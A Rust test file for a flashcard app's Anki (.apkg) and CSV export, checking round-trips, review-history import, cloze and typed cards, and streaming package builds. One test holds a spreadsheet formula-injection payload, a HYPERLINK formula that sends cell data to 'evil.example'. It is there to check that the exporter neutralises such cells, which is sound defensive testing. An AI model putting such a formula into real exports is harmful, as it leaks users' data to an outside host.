//! Export round-trips: what build_apkg/build_csv produce must re-import
//! through the parsers we already trust, with fronts/backs/tags/decks
//! intact. This exercises escaping, deck mapping, and schema-11 validity.

use flash_store::export::{build_apkg, build_csv, ExportCard};
use flash_store::import::{parse_apkg, parse_csv};

const NOW: i64 = 1_700_000_000_000;

fn sample_cards() -> Vec<ExportCard> {
    vec![
        ExportCard {
            deck: "Pharm".into(),
            front: "Warfarin antidote?".into(),
            back: "Vitamin K".into(),
            tags: vec!["exam-2".into(), "cardiac".into()],
            ..Default::default()
        },
        ExportCard {
            deck: "Pharm".into(),
            front: "Digoxin range & units?".into(),
            back: "0.5-2.0 ng/mL <therapeutic>".into(),
            ..Default::default()
        },
        ExportCard {
            deck: "Anatomy, upper".into(),
            front: "Quote \"test\" card".into(),
            back: "back, with commas".into(),
            tags: vec!["quirks".into()],
            ..Default::default()
        },
    ]
}

#[test]
fn apkg_round_trips_through_our_importer() {
    let cards = sample_cards();
    let bytes = build_apkg(&cards, &flash_store::export::ExportMedia::default(), NOW).unwrap();
    let parsed = parse_apkg(&bytes).unwrap();
    assert_eq!(parsed.rows.len(), cards.len());
    assert_eq!(parsed.skipped, 0);
    for (row, card) in parsed.rows.iter().zip(&cards) {
        assert_eq!(row.front, card.front);
        assert_eq!(row.back, card.back);
        assert_eq!(row.deck.as_deref(), Some(card.deck.as_str()));
        assert_eq!(row.tags, card.tags);
    }
}

#[test]
fn apkg_zip_contains_collection_and_media() {
    let bytes = build_apkg(
        &sample_cards(),
        &flash_store::export::ExportMedia::default(),
        NOW,
    )
    .unwrap();
    let mut zip = zip::ZipArchive::new(std::io::Cursor::new(bytes)).unwrap();
    assert!(zip.by_name("collection.anki2").is_ok());
    let mut media = zip.by_name("media").unwrap();
    let mut buf = String::new();
    std::io::Read::read_to_string(&mut media, &mut buf).unwrap();
    assert_eq!(buf, "{}");
}

#[test]
fn csv_round_trips_through_our_importer() {
    let cards = sample_cards();
    let csv = build_csv(&cards);
    let parsed = parse_csv(csv.as_bytes()).unwrap();
    assert_eq!(parsed.rows.len(), cards.len());
    for (row, card) in parsed.rows.iter().zip(&cards) {
        assert_eq!(row.front, card.front);
        assert_eq!(row.back, card.back);
        assert_eq!(row.deck.as_deref(), Some(card.deck.as_str()));
        assert_eq!(row.tags, card.tags);
    }
}

#[test]
fn csv_cells_that_look_like_formulas_are_neutralised() {
    let cards = vec![
        ExportCard {
            deck: "Sheets".into(),
            front: "=HYPERLINK(\"https://evil.example/?\"&A1,\"x\")".into(),
            back: "+1".into(),
            tags: vec!["-t".into()],
            ..Default::default()
        },
        ExportCard {
            deck: "@home".into(),
            front: "\tTab".into(),
            back: "plain".into(),
            ..Default::default()
        },
    ];
    let csv = build_csv(&cards);
    for line in csv.lines().skip(1) {
        for cell in line.split("\",\"").chain(line.split(',')) {
            let cell = cell.trim_matches('"');
            assert!(
                !cell.starts_with(['=', '+', '-', '@', '\t']),
                "cell {cell:?} in {line:?}"
            );
        }
    }
    // Still lossless through our own importer (the apostrophe is the
    // spreadsheet convention; the importer sees it as literal text).
    let parsed = parse_csv(csv.as_bytes()).unwrap();
    assert_eq!(parsed.rows.len(), 2);
    assert!(parsed.rows[0].front.ends_with("\"x\")"));
}

#[test]
fn empty_export_is_still_a_valid_package() {
    let bytes = build_apkg(&[], &flash_store::export::ExportMedia::default(), NOW).unwrap();
    let parsed = parse_apkg(&bytes).unwrap();
    assert!(parsed.rows.is_empty());
}

// ---- progress (revlog) import ----

/// Injects revlog rows into an .apkg produced by our own exporter (whose
/// card ids equal note ids), returning the modified package bytes.
fn with_revlog(apkg: Vec<u8>, rows: &[(i64, i64, i64, i64)]) -> Vec<u8> {
    use std::io::{Read, Write};
    // Unpack collection.anki2 to a temp file.
    let mut zip = zip::ZipArchive::new(std::io::Cursor::new(apkg)).unwrap();
    let mut db_bytes = Vec::new();
    zip.by_name("collection.anki2")
        .unwrap()
        .read_to_end(&mut db_bytes)
        .unwrap();
    // One directory per call: the test binary runs its tests on parallel
    // threads in one process, so a per-process directory would be removed
    // by whichever call finishes first while another still has its
    // SQLite file open (IOERR_DELETE_NOENT on a slow CI runner).
    static CALLS: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
    let n = CALLS.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let dir = std::env::temp_dir().join(format!("flash-revlog-test-{}-{n}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let db_path = dir.join("collection.anki2");
    std::fs::write(&db_path, &db_bytes).unwrap();

    let conn = rusqlite::Connection::open(&db_path).unwrap();
    for (id, cid, ease, kind) in rows {
        conn.execute(
            "INSERT INTO revlog (id, cid, usn, ease, ivl, lastIvl, factor, time, type)
             VALUES (?1, ?2, -1, ?3, 1, 1, 2500, 1000, ?4)",
            rusqlite::params![id, cid, ease, kind],
        )
        .unwrap();
    }
    drop(conn);

    let mut out = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    let options = zip::write::SimpleFileOptions::default();
    out.start_file("collection.anki2", options).unwrap();
    out.write_all(&std::fs::read(&db_path).unwrap()).unwrap();
    out.start_file("media", options).unwrap();
    out.write_all(b"{}").unwrap();
    let bytes = out.finish().unwrap().into_inner();
    let _ = std::fs::remove_dir_all(&dir);
    bytes
}

#[test]
fn apkg_revlog_becomes_review_history() {
    let cards = sample_cards();
    let apkg = build_apkg(&cards, &flash_store::export::ExportMedia::default(), NOW).unwrap();
    // Our exporter assigns ids from a counter: note NOW gets card NOW+1,
    // note NOW+2 gets card NOW+3, and so on.
    let first = NOW + 1;
    let day = 24 * 60 * 60 * 1000;
    let revlog = vec![
        (NOW - 9 * day, first, 2, 0), // learn ease 2 (Good, 3-button) -> rating 3
        (NOW - 8 * day, first, 2, 1), // review Hard -> 2
        (NOW - 2 * day, first, 3, 1), // review Good -> 3
        (NOW - day, first, 4, 3),     // cram: skipped
        (NOW - day + 1, first, 9, 1), // invalid ease: skipped
    ];
    let parsed = parse_apkg(&with_revlog(apkg, &revlog)).unwrap();
    let row = parsed
        .rows
        .iter()
        .find(|r| r.front == cards[0].front)
        .unwrap();
    assert_eq!(
        row.reviews,
        vec![(NOW - 9 * day, 3), (NOW - 8 * day, 2), (NOW - 2 * day, 3)]
    );
    // Other cards untouched.
    assert!(parsed
        .rows
        .iter()
        .filter(|r| r.front != cards[0].front)
        .all(|r| r.reviews.is_empty()));
}

#[test]
fn apkg_revlog_caps_at_most_recent_ten() {
    let cards = sample_cards();
    let apkg = build_apkg(&cards, &flash_store::export::ExportMedia::default(), NOW).unwrap();
    let revlog: Vec<(i64, i64, i64, i64)> = (0..25)
        .map(|i| (NOW - (25 - i) * 60_000, NOW + 1, 3, 1))
        .collect();
    let parsed = parse_apkg(&with_revlog(apkg, &revlog)).unwrap();
    let row = parsed
        .rows
        .iter()
        .find(|r| r.front == cards[0].front)
        .unwrap();
    assert_eq!(row.reviews.len(), 10);
    // The kept ten are the most recent, still chronological.
    assert_eq!(row.reviews[0].0, NOW - 10 * 60_000);
    assert_eq!(row.reviews[9].0, NOW - 60_000);
}

#[test]
fn apkg_without_revlog_has_no_reviews() {
    let parsed = parse_apkg(
        &build_apkg(
            &sample_cards(),
            &flash_store::export::ExportMedia::default(),
            NOW,
        )
        .unwrap(),
    )
    .unwrap();
    assert!(parsed.rows.iter().all(|r| r.reviews.is_empty()));
}

#[test]
fn typed_and_editor_cloze_cards_export_with_the_right_models() {
    use flash_store::notes::NoteType;
    use flash_store::richtext::sanitize_with_media as s;
    let generate_cards = |kind, front: &str, back: &str| {
        flash_store::notes::generate_cards(kind, &s(front), &s(back))
    };
    let typed = generate_cards(NoteType::BasicTyped, "Capital of France?", "Paris").unwrap();
    let cloze = generate_cards(
        NoteType::Cloze,
        "{{c1::Paris}} is in {{c2::France}}",
        "Extra",
    )
    .unwrap();
    let mut cards: Vec<ExportCard> = Vec::new();
    for g in typed.iter().chain(cloze.iter()) {
        cards.push(ExportCard {
            deck: "Geo".into(),
            front: g.text.front.clone(),
            back: g.text.back.clone(),
            front_html: g.extras.front_html.clone().map(|h| h.into_string()),
            back_html: g.extras.back_html.clone().map(|h| h.into_string()),
            cloze: g.extras.cloze_text.clone().zip(g.extras.cloze_index),
            type_answer: g.extras.type_answer.clone(),
            tags: vec![],
        });
    }
    let bytes = build_apkg(&cards, &flash_store::export::ExportMedia::default(), NOW).unwrap();
    let parsed = parse_apkg(&bytes).unwrap();
    // One typed note + one cloze note that fans back out into two cards.
    assert_eq!(parsed.rows.len(), 3, "{:?}", parsed.rows);
    let typed_row = parsed
        .rows
        .iter()
        .find(|r| r.front == "Capital of France?")
        .expect("typed card round-trips");
    assert_eq!(typed_row.type_answer.as_deref(), Some("Paris"));
    let cloze_rows: Vec<_> = parsed
        .rows
        .iter()
        .filter(|r| r.cloze_index.is_some())
        .collect();
    assert_eq!(cloze_rows.len(), 2);
    assert_eq!(
        cloze_rows[0].cloze_text.as_deref(),
        Some("{{c1::Paris}} is in {{c2::France}}\u{1f}Extra")
    );
    assert_eq!(cloze_rows[0].front, "[...] is in France");
}

/// The streaming builder writes the same package to a file that the
/// buffered one returns in memory, pulling each blob exactly once, in
/// package order, and only once the previous one has been written.
#[test]
fn streaming_builder_matches_the_buffered_one_and_reads_each_blob_once() {
    use flash_store::export::{build_apkg_into, ExportMedia, ExportMediaEntry};
    use std::io::Read;

    let mut cards = sample_cards();
    cards[0].front_html = Some(r#"<img src="/media/7"> <img src="/media/9">"#.into());
    let media = ExportMedia {
        files: vec![
            ("a.png".into(), vec![1u8; 300]),
            ("b.png".into(), vec![2u8; 1_000]),
            ("c.png".into(), vec![3u8; 10]),
        ],
        names: [(7, "a.png".to_string()), (9, "b.png".to_string())]
            .into_iter()
            .collect(),
    };
    let buffered = build_apkg(&cards, &media, NOW).unwrap();

    let path =
        std::env::temp_dir().join(format!("flash-export-stream-{}.apkg", std::process::id()));
    let file = std::fs::File::create(&path).unwrap();
    let mut order = Vec::new();
    let mut read = |entry: &ExportMediaEntry| {
        order.push(entry.name.clone());
        media
            .files
            .iter()
            .find(|(name, _)| name == &entry.name)
            .map(|(_, bytes)| bytes.clone())
            .ok_or_else(|| format!("no such entry {}", entry.name))
    };
    build_apkg_into(&cards, &media.plan(), &mut read, NOW, file).unwrap();
    assert_eq!(order, ["a.png", "b.png", "c.png"]);
    let streamed = std::fs::read(&path).unwrap();
    let _ = std::fs::remove_file(&path);

    // Same entries, same media bytes, same manifest; the collection is
    // compared through the importer (SQLite's page bytes may differ).
    let mut a = zip::ZipArchive::new(std::io::Cursor::new(buffered.clone())).unwrap();
    let mut b = zip::ZipArchive::new(std::io::Cursor::new(streamed.clone())).unwrap();
    let names = |z: &zip::ZipArchive<_>| z.file_names().map(str::to_string).collect::<Vec<_>>();
    assert_eq!(names(&a), names(&b));
    for name in ["0", "1", "2", "media"] {
        let mut x = Vec::new();
        a.by_name(name).unwrap().read_to_end(&mut x).unwrap();
        let mut y = Vec::new();
        b.by_name(name).unwrap().read_to_end(&mut y).unwrap();
        assert_eq!(x, y, "entry {name}");
    }
    let from_buffer = parse_apkg(&buffered).unwrap();
    let from_stream = parse_apkg(&streamed).unwrap();
    let text = |p: &flash_store::import::ParsedImport| {
        p.rows
            .iter()
            .map(|r| (r.front.clone(), r.back.clone(), r.front_html.clone()))
            .collect::<Vec<_>>()
    };
    assert_eq!(text(&from_stream), text(&from_buffer));
    assert_eq!(from_stream.media.referenced(), 2);

    // A blob the store cannot produce fails the whole build; nothing is
    // silently left out of the package.
    let mut failing = |entry: &ExportMediaEntry| -> Result<Vec<u8>, String> {
        Err(format!("gone: {}", entry.name))
    };
    let err = build_apkg_into(
        &cards,
        &media.plan(),
        &mut failing,
        NOW,
        std::io::Cursor::new(Vec::new()),
    )
    .unwrap_err();
    assert!(err.contains("gone: a.png"), "{err}");
}
